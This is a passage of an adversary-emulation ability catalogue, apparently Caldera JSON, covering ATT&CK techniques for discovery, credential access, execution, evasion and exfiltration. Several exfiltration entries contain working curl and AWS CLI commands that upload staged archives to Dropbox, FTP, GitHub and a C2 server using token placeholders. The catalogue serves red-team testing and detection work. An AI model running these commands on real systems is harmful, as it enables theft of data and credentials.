        "name": "Enumerate PlugNPlay Camera",
        "tactic": "reconnaissance",
        "plugin": "atomic",
        "ability_id": "53861bc51eb67cb9775c95b9e02ad141",
        "technique_id": "T1592.001",
        "repeatable": false
    },
    {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate Root Domain linked policies Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "613dc87cebac339d20973268e0bb1c0b",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "When successful, accounts that do not require kerberos pre-auth will be returned\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate Users Not Requiring Pre Auth (ASRepRoast)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "f5dd56d901db9f95668988426326bc3a",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate all accounts (Domain)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "ee41528024c63881b53302e996a79020",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Enumerate all accounts\nUpon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate all accounts on Windows (Local)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "6334877e8e3ba48f7835d4856d90a282",
        "technique_id": "T1087.001",
        "repeatable": false
    },
    {
        "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate all accounts via PowerShell (Domain)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "4712f45e41760276d20885bbc885a2ef",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate all accounts via PowerShell (Local)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "e528524d6a3cddaaddc89fcc719e2a3f",
        "technique_id": "T1087.001",
        "repeatable": false
    },
    {
        "description": "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "f5606cc7632289d5ca72d4a485c14f6b",
        "technique_id": "T1555",
        "repeatable": false
    },
    {
        "description": "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "6bbb6f8b1db42e2c2c79892e8c31feb3",
        "technique_id": "T1555",
        "repeatable": false
    },
    {
        "description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate domain computers within Active Directory using DirectorySearcher",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "681fd384d66be9e180a74e5fecdc4ab6",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate logged on users via CMD (Domain)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "d3305a715918c2d6b60c42e9071247b1",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Enumerate logged on users. Upon execution, logged on users will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumerate logged on users via CMD (Local)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "8f85d74c3e78c652a9162dcf1296b404",
        "technique_id": "T1087.001",
        "repeatable": false
    },
    {
        "description": "Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word \"password\" will be displayed.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials in Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumeration for Credentials in Registry",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "3e5b04b8ee0a1a4950da8f35d95e65fc",
        "technique_id": "T1552.002",
        "repeatable": false
    },
    {
        "description": "Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry\nentries are found, they will be displayed.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials in Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Enumeration for PuTTY Credentials in Registry",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "262666862164b89881f6b5c565c0a3be",
        "technique_id": "T1552.002",
        "repeatable": false
    },
    {
        "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Environment variables discovery on windows",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "b5b9bf30b09bf2f3367effa3022e7aa7",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will execute the program defined in the redirection program registry entry.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Event Viewer Registry Modification - Redirection Program",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "9a413f933aa7381d0e1f3f89001f6717",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will open the URL or execute the program defined in the redirection URL registry entry.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Event Viewer Registry Modification - Redirection URL",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "838f5d289636e22c8aa2b36d8462622a",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Lists the domain password policy to console on Windows.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Password Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Examine domain password policy - Windows",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "38f6f0e50a6b196140ec40d3dc9cc9e6",
        "technique_id": "T1201",
        "repeatable": false
    },
    {
        "description": "Lists the local password policy to console on Windows.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Password Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Examine local password policy - Windows",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "57296a2ddbeb7423c05feef2fe972111",
        "technique_id": "T1201",
        "repeatable": false
    },
    {
        "description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Excel 4 Macro",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "623806a6fd4d832b6692eb275535f636",
        "technique_id": "T1204.002",
        "repeatable": false
    },
    {
        "description": "Utilize PowerShell to echo a command to clipboard and execute it\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Clipboard Data",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execute Commands from Clipboard using PowerShell",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "8c0f619c7dfd33907bf20b1dfb58022b",
        "technique_id": "T1115",
        "repeatable": false
    },
    {
        "description": "Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execute LNK file from ISO",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0b3e89fa4ed4a3eabadd330b44c3ec3d",
        "technique_id": "T1553.005",
        "repeatable": false
    },
    {
        "description": "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inter-Process Communication: Dynamic Data Exchange",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execute PowerShell script via Word DDE",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "e401dd1a8de06f4a52b66736c2050bb7",
        "technique_id": "T1559.002",
        "repeatable": false
    },
    {
        "description": "Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.\n\nUpon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`\n\n[BlackCat Ransomware (ALPHV)](https://www.varonis.com/blog/blackcat-ransomware)  \n[Cybereason vs. BlackCat Ransomware](https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware)\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Services: Service Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execute a Command as a Service",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "a0eddf3ba6bede6cf017eb99ee1cefd8",
        "technique_id": "T1569.002",
        "repeatable": false
    },
    {
        "description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execute base64-encoded PowerShell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b62952c5352ee68c1340feb08a5a02a1",
        "technique_id": "T1027",
        "repeatable": false
    },
    {
        "description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execute base64-encoded PowerShell from Windows Registry",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "89a4fca013d3d39fc4effb1f6c8a8d74",
        "technique_id": "T1027",
        "repeatable": false
    },
    {
        "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: SMB/Windows Admin Shares",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execute command writing output to local Admin Share",
        "tactic": "lateral-movement",
        "plugin": "atomic",
        "ability_id": "5c2ddc375b4963647ac9c913641ab6d6",
        "technique_id": "T1021.002",
        "repeatable": false
    },
    {
        "description": "Mimic execution of compressed executable. When successfully executed, calculator.exe will open.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execution from Compressed File",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "fcbaf10bb84ae47998ae094c053bdef8",
        "technique_id": "T1027",
        "repeatable": false
    },
    {
        "description": "IcedID uses this TTP as follows:\n  rundll32.exe url.dll,OpenURL %PUBLIC%\\index.hta\nTrickbot uses this TTP as follows:\n  rundll32.exe URL.dll,FileProtocolHandler C:\\\\..\\\\Detail\\\\akteullen.vbs\n\nIn this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with \"rundll32 spawned wscript\"\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execution of HTA and VBS Files using Rundll32 and URL.dll",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e30d392a79640eb86ee5fedd78416a33",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "Rundll32.exe running non-dll \n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Rundll32",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execution of non-dll using rundll32.exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "16e96b0f0c0021663b2f5dfafabee6f0",
        "technique_id": "T1218.011",
        "repeatable": false
    },
    {
        "description": "When a service is created whose executable path contains spaces and isn\u2019t enclosed within quotes, leads to a vulnerability\nknown as Unquoted Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if an executable program.exe in C:\\ exists, C:\\program.exe will be executed instead of test.exe in C:\\Program Files\\subfolder\\test.exe.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hijack Execution Flow: Path Interception by Unquoted Path",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execution of program.exe as service with unquoted service path",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "60a4a8dcf702a076bbf4e04d3a049263",
        "technique_id": "T1574.009",
        "repeatable": false
    },
    {
        "description": "Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Native API",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Execution through API - CreateProcess",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "43f1775664b60cdf31c1b9ea0d7dd8a7",
        "technique_id": "T1106",
        "repeatable": false
    },
    {
        "description": "This will exfiltrate an archive to Dropbox.",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration to Cloud Storage",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -X POST https://content.dropboxapi.com/2/files/upload\n    --header \"Authorization: Bearer #{dropbox.api.key}\"\n    --header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/#{dropbox.target.dir}/$RemoteName\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,\\\"mute\\\": false,\\\"strict_conflict\\\": false}\"\n    --header \"Content-Type: application/octet-stream\"\n    --data-binary @#{host.dir.compress}",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Exfil Compressed Archive to Dropbox",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "3ce95a28-25fc-4a7e-a0cd-0fdb190e2081",
        "technique_id": "T1567.002",
        "repeatable": false
    },
    {
        "description": "This ability exfiltrates a compressed archive to an FTP server.",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:'#{ftp.user.password}'",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Exfil Compressed Archive to FTP Server",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "d754878c-17dd-46dc-891c-a993f8a10336",
        "technique_id": "T1048.003",
        "repeatable": false
    },
    {
        "description": "This ability exfiltrates a compressed archive to Github Gists (Base64 Encoded). To reconstitute, save\nthe base64 string from the Gist and run ----\n(Powershell) [Convert]::FromBase64String($(Get-Content b64.txt)) | set-content archive.extension -encoding byte ----\n(Linux) cat b64.txt | base64 -d > archive.extension\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration to Code Repository",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "GHUser=\"#{github.user.name}\";\nGHPAT=\"#{github.access.token}\";\nFileContent=$(base64 #{host.dir.compress});\nLocalFile='#{host.dir.compress}';\nRemoteFile=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ntmp_file=$(mktemp);\necho \"{\\\"public\\\": false,\\\"files\\\": {\\\"$RemoteFile\\\": {\\\"content\\\": \\\"${FileContent}\\\"}}}\" > $tmp_file;\ncurl --silent --output /dev/null --show-error --fail -X POST -d @$tmp_file -u $GHUser:$GHPAT https://api.github.com/gists;\nrm $tmp_file",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Exfil Compressed Archive to Github Gist",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "0582dc26-e0cf-4645-88cf-f37a02279976",
        "technique_id": "T1567.001",
        "repeatable": false
    },
    {
        "description": "This will exfiltrate a given compressed directory to a GitHub repository. It assumes that all the facts supplied are valid.",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration to Code Repository",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalFile='#{host.dir.compress}';\nHeader=\"Authorization: token $GHPAT\";\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\necho \"{\\\"message\\\":\\\"Committed $RemoteName\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\nbase64 -w 0 $LocalFile >>/tmp/b64;\necho \"\\\"}\" >>/tmp/b64;\ncontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\nrm /tmp/b64;",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Exfil Compressed Archive to Github Repository",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "4a1120a5-971c-457f-bb07-60641b4723fd",
        "technique_id": "T1567.001",
        "repeatable": false
    },
    {
        "description": "Exfiltrate the compressed archive to the provided S3 bucket using the AWS CLI. It is assumed that the user\ncredentials configured with AWS CLI have the proper permissions to write to the target S3 bucket.\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration to Cloud Storage",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 rm s3://#{s3.source.name}/$RemoteName;"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Exfil Compressed Archive to S3 via AWS CLI",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "e7bf5dc7-62e4-48b2-acf8-abaf8734c19c",
        "technique_id": "T1567.002",
        "repeatable": false
    },
    {
        "description": "Use the AWS SDK for GoLang to upload the compressed archive to the provided S3 bucket.\nIt is assumed that the current user credentials have the proper permissions to write to the target S3 bucket.\nRequires the agent to be compiled with the native_aws extension.\nTimeout set to 45 seconds.\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration to Cloud Storage",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "s3upload \"#{host.dir.compress}\" \"#{s3.source.region}\" \"#{s3.source.name}\" \"aws-#{paw}-compressed\" 45s",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "native",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Exfil Compressed Archive to S3 via Golang",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "dd4d3d6f-be0a-4d80-ada2-0b7f3228d2dc",
        "technique_id": "T1567.002",
        "repeatable": false
    },
    {
        "description": "This ability will exfiltrate all files in a set staged directory to a repository in GitHub.\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration to Code Repository",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.staged"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalDirectory=#{host.dir.staged};\nHeader=\"Authorization: token $GHPAT\";\n\nfor file in $LocalDirectory/*.*; do\n  TempName=$(echo $file | sed \"s/ /-/g\")\n\tRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename \"$TempName\")\";\n\techo \"{\\\"message\\\":\\\"Committed $(basename $TempName) at: $(date)\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\n  base64 -w 0 \"$file\" >>/tmp/b64;\n  echo \"\\\"}\" >>/tmp/b64;\n\tcontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\n  rm /tmp/b64;\ndone;",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Exfil Directory Files to GitHub",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "a201bec2-a193-4b58-bf0e-57fa621da474",
        "technique_id": "T1567.001",
        "repeatable": false
    },
    {
        "description": "Exfil the staged directory",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over C2 Channel",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Exfil staged directory",
        "tactic": "exfiltration",
        "plugin": "stockpile",
        "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
        "technique_id": "T1041",
        "repeatable": false
    },
    {
        "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
